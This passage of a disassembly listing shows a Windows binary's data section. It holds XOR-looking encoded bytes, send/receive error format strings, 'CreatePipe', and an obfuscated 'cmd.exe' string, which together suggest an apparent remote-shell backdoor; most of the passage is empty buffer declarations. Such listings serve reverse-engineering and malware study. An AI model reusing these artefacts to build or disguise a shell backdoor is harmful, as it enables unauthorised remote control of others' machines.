db  91h ; ‘
db 0C3h ; Ã
db 0D0h ; Ð
db 0B3h ; ³
db 0DDh ; Ý
db 0D6h ; Ö
db 0C7h ; Ç
db 0C4h ; Ä
db 0DCh ; Ü
db 0C1h ; Á
db 0D8h ; Ø
db 0B3h ; ³
db 0C3h ; Ã
db 0C1h ; Á
db 0DCh ; Ü
db 0D4h ; Ô
db 0C1h ; Á
db 0D2h ; Ò
db 0DEh ; Þ
db 0B3h ; ³
db 0A2h ; ¢
db 0BDh ; ½
db 0A3h ; £
db  93h ; “
db  91h ; ‘
db 0DFh ; ß
db 0D2h ; Ò
db 0DDh ; Ý
db 0DEh ; Þ
db 0D2h ; Ò
db 0DDh ; Ý
db 0A2h ; ¢
db 0BDh ; ½
db 0A3h ; £
db  93h ; “
db  91h ; ‘
db 0C4h ; Ä
db 0FAh ; ú
db 0FDh ; ý
db 0F7h ; ÷
db 0FCh ; ü
db 0E4h ; ä
db 0E0h ; à
db 0B3h ; ³
db 0F5h ; õ
db 0FCh ; ü
db 0E1h ; á
db 0B3h ; ³
db 0C4h ; Ä
db 0FCh ; ü
db 0E1h ; á
db 0F8h ; ø
db 0F4h ; ô
db 0E1h ; á
db 0FCh ; ü
db 0E6h ; æ
db 0E3h ; ã
db 0E0h ; à
db 0B3h ; ³
db 0A0h ;  
db 0BDh ; ½
db 0A2h ; ¢
db 0F2h ; ò
db  93h ; “
db  91h ; ‘
db 0DFh ; ß
db 0DEh ; Þ
db 0A2h ; ¢
db 0BDh ; ½
db 0A1h ; ¡
db 0CBh ; Ë
db 0A3h ; £
db 0A3h ; £
db 0A1h ; ¡
db  93h ; “
db  91h ; ‘
db 0DFh ; ß
db 0D2h ; Ò
db 0DDh ; Ý
db 0DEh ; Þ
db 0D2h ; Ò
db 0DDh ; Ý
db 0A1h ; ¡
db 0BDh ; ½
db 0A2h ; ¢
db  93h ; “
db  91h ; ‘
db 0DDh ; Ý
db 0C7h ; Ç
db 0B3h ; ³
db 0DFh ; ß
db 0DEh ; Þ
db 0B3h ; ³
db 0A3h ; £
db 0BDh ; ½
db 0A2h ; ¢
db 0A1h ; ¡
db  93h ; “
db    0
db    0
db    0
; char aSS_2[]
aSS_2 db '[%s:%s]',0
; char aSRcverror[]
aSRcverror db '[%s:RcvError]',0
align 4
aSSenderror db '[%s:SendError]',0
align 4
; char asc_409DD8[]
asc_409DD8 db '\\',0
align 4
; CHAR aSetcurrentdire[]
aSetcurrentdire db 'SetCurrentDirectoryA',0
align 4
dword_409DF4 dd 2E646D58h
dword_409DF8 dd 657854h
; char aS_2[]
aS_2 db '%s',0Dh,0Ah,0
align 4
; CHAR aCreatepipe[]
aCreatepipe db 'CreatePipe',0
align 10h
; char aAb_0[]
aAb_0 db 'ab+',0
; char aS_3[]
aS_3 db '%S',0
align 10h
dword_409E20 dd 1
align 8
; CHAR FileName[276]
FileName db 114h dup(0)
; CHAR byte_409F3C[260]
byte_409F3C db 0C4h dup(0), 40h dup(?)
; HANDLE ProcessInformation
ProcessInformation dd ?
align 10h
; HANDLE dword_40A050
dword_40A050 dd ?
dword_40A054 dd ?
dword_40A058 dd ?
; HANDLE hFile
hFile dd ?
; HANDLE dword_40A060
dword_40A060 dd ?
; HANDLE hHandle
hHandle dd ?
; HANDLE hEvent
hEvent dd ?
dword_40A06C dd ?
db    ? ;
db    ? ;
db    ? ;
db    ? ;
dword_40A074 dd ?
dword_40A078 dd ?
dword_40A07C dd ?
dword_40A080 dd ?
dword_40A084 dd ?
dword_40A088 dd ?
byte_40A08C db ?
align 10h
; LPCSTR lpPathName
lpPathName dd ?
dword_40A094 dd ?
dword_40A098 dd ?
dword_40A09C dd ?
; const CHAR pszValue
pszValue db ?
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
; BYTE Data
Data dd ?
dword_40A124 dd ?
dword_40A128 dd ?
unk_40A12C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A1AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A22C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A2AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A32C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A3AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A42C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A4AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A52C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A5AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A62C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A6AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
; CHAR byte_40A72C[128]
byte_40A72C db 80h dup(?)
unk_40A7AC db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
unk_40A82C db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
db    ? ;
